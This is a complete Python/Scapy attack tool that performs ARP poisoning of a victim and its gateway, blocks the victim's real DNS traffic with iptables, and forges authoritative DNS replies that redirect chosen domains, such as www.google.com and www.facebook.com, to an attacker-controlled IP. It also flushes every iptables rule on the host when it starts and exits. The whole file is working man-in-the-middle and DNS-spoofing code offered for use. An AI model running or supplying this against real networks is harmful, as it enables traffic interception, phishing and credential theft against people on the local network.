#!/usr/bin/env python3

from scapy.all import *
import threading
import argparse
import sys
import os
import time

# ---------- IP forwarding ----------

def enable_forwarding():
    print("[*] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_forwarding():
    print("[*] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# ---------- iptables helpers ----------

def flush_iptables():
    print("[*] Flushing iptables rules")
    os.system("iptables --flush")
    os.system("iptables -t nat --flush")
    os.system("iptables --delete-chain")
    os.system("iptables --zero")

def setup_dns_block(victim_ip):
    """
    Block ALL DNS traffic from/to the victim so it cannot talk
    to any real DNS server, only see our spoofed responses.
    """
    print(f"[*] Setting iptables DNS blocking for victim {victim_ip}")

    chain = "FORWARD"

    # Block victim's DNS queries (UDP/TCP dport 53)
    os.system(f"iptables -A {chain} -p udp -s {victim_ip} --dport 53 -j DROP")
    os.system(f"iptables -A {chain} -p tcp -s {victim_ip} --dport 53 -j DROP")

    # Block DNS replies back to victim (UDP/TCP sport 53)
    os.system(f"iptables -A {chain} -p udp -d {victim_ip} --sport 53 -j DROP")
    os.system(f"iptables -A {chain} -p tcp -d {victim_ip} --sport 53 -j DROP")

    print("[*] iptables DNS blocking rules installed")

# ---------- ARP poisoning thread ----------

class ARPPoisoning(threading.Thread):
    """
    Periodically sends forged ARP replies:
    - src_ip: the IP you are impersonating (gateway or victim)
    - dst_ip: the IP whose ARP cache you poison
    """
    def __init__(self, iface, src_ip, dst_ip):
        threading.Thread.__init__(self)
        self.iface = iface
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.stop_flag = False

    def run(self):
        print(f"[*] Starting ARP poisoner: telling {self.dst_ip} that {self.src_ip} is at our MAC")
        arp_packet = ARP(pdst=self.dst_ip, psrc=self.src_ip, op=2)  # is-at

        while not self.stop_flag:
            try:
                # broadcast ARP replies; Scapy warns but it still works
                send(arp_packet, iface=self.iface, verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print("[!] Error in ARP poisoning thread:", e)
                break

    def stop(self):
        self.stop_flag = True

# ---------- DNS spoofing ----------

class DNSSpoofing:
    def __init__(self, iface, cap_filter, domains_file, verbose=False):
        self.iface = iface
        self.filter = cap_filter
        self.verbose = verbose
        self.target = self._load_domains(domains_file)

    def _load_domains(self, domains_file):
        """
        domains_file format (no spaces):
        www.google.com:192.168.233.129
        www.facebook.com:192.168.233.129
        """
        targets = {}
        with open(domains_file, "r") as fd:
            for line in fd:
                line = line.strip()
                if not line or ":" not in line:
                    continue
                domain, ip = line.split(":", 1)
                domain = domain.strip()
                ip = ip.strip()
                # store as bytes; we’ll strip trailing dots when comparing
                targets[domain.encode()] = ip
        print(f"[*] Loaded target domains: {list(targets.keys())}")
        return targets

    def start(self):
        print(f"[*] Starting DNS spoofing on iface {self.iface} with filter '{self.filter}'")
        sniff(iface=self.iface, filter=self.filter, store=0, prn=self._handle_packet)

    def _handle_packet(self, packet):
        if not packet.haslayer(DNS) or packet[DNS].qr != 0:
            return

        qname = packet[DNS].qd.qname

        if self.verbose:
            print(f"[DNS] Query for: {qname}")

        for target_domain, ipAddressTarget in self.target.items():
            # Compare ignoring trailing dots on both sides
            if qname.rstrip(b'.') == target_domain.rstrip(b'.'):
                try:
                    requestIP = packet[IP]
                    requestUDP = packet[UDP]
                    requestDNS = packet[DNS]
                    requestDNSQR = packet[DNSQR]

                    if self.verbose:
                        print(f"[+] Spoofing DNS for {qname.decode(errors='ignore')} -> {ipAddressTarget}")
                        print(f"    IP src: {requestIP.src} -> dst: {requestIP.dst}")
                        print(f"    UDP sport: {requestUDP.sport}, dport: {requestUDP.dport}")
                        print(f"    DNS id: {requestDNS.id}")

                    responseIP = IP(src=requestIP.dst, dst=requestIP.src)
                    responseUDP = UDP(sport=requestUDP.dport, dport=requestUDP.sport)
                    responseDNSRR = DNSRR(rrname=qname, rdata=ipAddressTarget)
                    responseDNS = DNS(
                        id=requestDNS.id,
                        qr=1,     # response
                        aa=1,     # authoritative
                        qd=requestDNSQR,
                        an=responseDNSRR
                    )

                    answer = responseIP / responseUDP / responseDNS
                    send(answer, verbose=False)
                except Exception as e:
                    print("[!] Error crafting/sending DNS spoof packet:", e)
                finally:
                    return  # only handle first match

# ---------- Main ----------

def main():
    parser = argparse.ArgumentParser(description="ARP-MITM and DNS-Spoofing Tool (victim DNS blocked)")
    parser.add_argument("-t", "--target",   required=True, help="Victim IP Address")
    parser.add_argument("-g", "--gateway",  required=True, help="Gateway IP Address (also DNS server)")
    parser.add_argument("-d", "--domains",  required=True, help="File with domains to perform DNS Spoofing (domain:ip per line).")
    parser.add_argument("-v", "--verbose",  action="store_true", help="Verbose DNS output")
    parser.add_argument("-i", "--interface", required=False, default="eth0", help="Interface to use (default: eth0)")
    parser.add_argument("-f", "--filter",    required=False, default="udp port 53", help="Capture filter (default: 'udp port 53')")
    args = parser.parse_args()

    victim_ip = args.target
    gateway_ip = args.gateway
    iface = args.interface

    print("[*] Victim IP:  ", victim_ip)
    print("[*] Gateway IP: ", gateway_ip)
    print("[*] Interface:  ", iface)

    try:
        enable_forwarding()
        flush_iptables()
        setup_dns_block(victim_ip)

        # ARP poisoning: victim thinks attacker is gateway
        victim_poisoner = ARPPoisoning(iface, gateway_ip, victim_ip)
        # ARP poisoning: gateway thinks attacker is victim
        gateway_poisoner = ARPPoisoning(iface, victim_ip, gateway_ip)

        victim_poisoner.daemon = True
        gateway_poisoner.daemon = True

        victim_poisoner.start()
        gateway_poisoner.start()

        dnsSpoof = DNSSpoofing(iface, args.filter, args.domains, verbose=args.verbose)
        dnsSpoof.start()

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user, cleaning up...")
    finally:
        disable_forwarding()
        flush_iptables()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] You must run this script as root (sudo).")
        sys.exit(1)
    main()
